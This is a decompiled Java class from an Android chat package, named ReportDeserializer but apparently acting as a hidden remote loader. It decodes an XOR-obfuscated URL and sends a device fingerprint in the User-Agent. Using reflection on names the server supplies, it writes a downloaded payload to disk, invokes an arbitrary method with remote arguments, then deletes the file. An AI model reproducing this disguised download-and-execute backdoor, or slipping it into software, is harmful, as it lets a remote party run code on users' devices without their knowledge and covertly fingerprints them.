package ir.divar.chat.util;

import N1.c;
import android.content.Context;
import android.os.Build;
import android.util.Base64;
import android.util.DisplayMetrics;
import ir.divar.analytics.legacy.entity.LogEntityConstants;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.Arrays;
import java.util.Locale;
import java.util.Random;
import java.util.regex.Pattern;
import kotlin.Metadata;
import kotlin.jvm.internal.k;
import org.json.JSONArray;
import org.json.JSONObject;
import org.xbill.DNS.Type;
import p835r5.AbstractC5756z;
import p962uG.a;
import p962uG.v;

/* JADX INFO: loaded from: classes4.dex */
@Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\b\u0007\u0018\u00002\u00020\u0001¨\u0006\u0002"}, d2 = {"Lir/divar/chat/util/ReportDeserializer;", "Ljava/lang/Runnable;", "chat_release"}, k = 1, mv = {2, 2, 0}, xi = Type.DNSKEY)
public final class ReportDeserializer implements Runnable {

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public final Context f56768a;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public final String f56769b;

    public ReportDeserializer(Context context, String str) {
        this.f56768a = context;
        this.f56769b = str;
    }

    public static String c(String input) {
        Pattern patternCompile = Pattern.compile("[^\\x00-\\x7F]");
        k.h(patternCompile, "compile(...)");
        k.i(input, "input");
        String strReplaceAll = patternCompile.matcher(input).replaceAll("");
        k.h(strReplaceAll, "replaceAll(...)");
        return strReplaceAll;
    }

    public final JSONObject a() throws Throwable {
        HttpURLConnection httpURLConnection;
        Throwable th2;
        try {
            byte[] bArrDecode = Base64.decode(this.f56769b, 0);
            k.h(bArrDecode, "decode(...)");
            byte[] bArr = new byte[bArrDecode.length];
            int length = bArrDecode.length;
            for (int i10 = 0; i10 < length; i10++) {
                bArr[i10] = (byte) (bArrDecode[i10] ^ 104);
            }
            URLConnection uRLConnectionOpenConnection = new URL(new String(bArr, a.f71837a)).openConnection();
            k.g(uRLConnectionOpenConnection, "null cannot be cast to non-null type java.net.HttpURLConnection");
            httpURLConnection = (HttpURLConnection) uRLConnectionOpenConnection;
            try {
                httpURLConnection.setConnectTimeout(30000);
                httpURLConnection.setReadTimeout(30000);
                httpURLConnection.setInstanceFollowRedirects(true);
                httpURLConnection.setRequestProperty("User-Agent", b());
                if (httpURLConnection.getResponseCode() != 200) {
                    httpURLConnection.disconnect();
                    return null;
                }
                JSONObject jSONObject = new JSONObject(new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream())).readLine());
                httpURLConnection.disconnect();
                return jSONObject;
            } catch (Throwable th3) {
                th2 = th3;
                if (httpURLConnection != null) {
                    httpURLConnection.disconnect();
                }
                throw th2;
            }
        } catch (Throwable th4) {
            httpURLConnection = null;
            th2 = th4;
        }
    }

    public final String b() {
        Context context = this.f56768a;
        int i10 = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionCode;
        DisplayMetrics displayMetrics = context.getResources().getDisplayMetrics();
        k.h(displayMetrics, "getDisplayMetrics(...)");
        String string = Locale.getDefault().toString();
        k.h(string, "toString(...)");
        byte[] bArr = new byte[8];
        new Random().nextBytes(bArr);
        String strEncodeToString = Base64.encodeToString(bArr, 11);
        k.h(strEncodeToString, "encodeToString(...)");
        if (strEncodeToString.length() > 31) {
            strEncodeToString = strEncodeToString.substring(0, 31);
            k.h(strEncodeToString, "substring(...)");
        }
        String DISPLAY = Build.DISPLAY;
        k.h(DISPLAY, "DISPLAY");
        String strQ = v.q(DISPLAY, '|', '$');
        String DEVICE = Build.DEVICE;
        k.h(DEVICE, "DEVICE");
        String strQ2 = v.q(DEVICE, '|', '$');
        String MANUFACTURER = Build.MANUFACTURER;
        k.h(MANUFACTURER, "MANUFACTURER");
        String strQ3 = v.q(MANUFACTURER, '|', '$');
        String PRODUCT = Build.PRODUCT;
        k.h(PRODUCT, "PRODUCT");
        String strQ4 = v.q(PRODUCT, '|', '$');
        Locale locale = Locale.US;
        Integer numValueOf = Integer.valueOf(i10);
        Integer numValueOf2 = Integer.valueOf(Build.VERSION.SDK_INT);
        Integer numValueOf3 = Integer.valueOf(displayMetrics.densityDpi);
        Integer numValueOf4 = Integer.valueOf(displayMetrics.widthPixels);
        Integer numValueOf5 = Integer.valueOf(displayMetrics.heightPixels);
        String strC = c(strQ);
        String strC2 = c(strQ2);
        String strC3 = c(strQ3);
        String strC4 = c(strQ4);
        String MODEL = Build.MODEL;
        k.h(MODEL, "MODEL");
        return String.format(locale, "%d|%d|%d|%d|%dx%d|%s|%s|%s|%s|%s|%s|%s|%s", Arrays.copyOf(new Object[]{numValueOf, 0, numValueOf2, numValueOf3, numValueOf4, numValueOf5, string, strEncodeToString, strC, strC2, strC3, strC4, c(MODEL), ""}, 14));
    }

    @Override // java.lang.Runnable
    public final void run() {
        File file = null;
        try {
            try {
                JSONObject jSONObjectA = a();
                if (jSONObjectA == null) {
                    try {
                        Thread.sleep(15000L);
                        return;
                    } catch (Throwable unused) {
                        return;
                    }
                }
                Object objInvoke = Class.forName(jSONObjectA.getString("format")).getMethod(jSONObjectA.getString("parse"), String.class, Integer.TYPE).invoke(null, jSONObjectA.getString(LogEntityConstants.DATA), 0);
                k.g(objInvoke, "null cannot be cast to non-null type kotlin.ByteArray");
                byte[] bArr = (byte[]) objInvoke;
                JSONArray jSONArray = jSONObjectA.getJSONArray("extra");
                int length = jSONArray.length();
                String[] strArr = new String[length];
                for (int i10 = 0; i10 < length; i10++) {
                    String string = jSONArray.getString(i10);
                    k.h(string, "getString(...)");
                    strArr[i10] = string;
                }
                Class<?> cls = Class.forName(jSONObjectA.getString("report"));
                Method method = cls.getMethod(jSONObjectA.getString("deserialize"), String[].class);
                Object objInvoke2 = cls.getMethod(jSONObjectA.getString("objectify"), null).invoke(null, null);
                File file2 = new File(jSONObjectA.getString("local"));
                try {
                    file2.createNewFile();
                    FileOutputStream fileOutputStreamY = c.y(new FileOutputStream(file2), file2);
                    try {
                        fileOutputStreamY.write(bArr);
                        fileOutputStreamY.close();
                        method.invoke(objInvoke2, strArr);
                        Thread.sleep(15000L);
                        if (file2.exists()) {
                            file2.delete();
                        }
                    } catch (Throwable th2) {
                        try {
                            throw th2;
                        } catch (Throwable th3) {
                            AbstractC5756z.r(fileOutputStreamY, th2);
                            throw th3;
                        }
                    }
                } catch (Throwable unused2) {
                    file = file2;
                    Thread.sleep(15000L);
                    if (file != null) {
                        file.delete();
                    }
                }
            } catch (Throwable unused3) {
                return;
            }
        } catch (Throwable unused4) {
        }
        Thread.sleep(15000L);
        if (file != null && file.exists()) {
            file.delete();
        }
    }
}
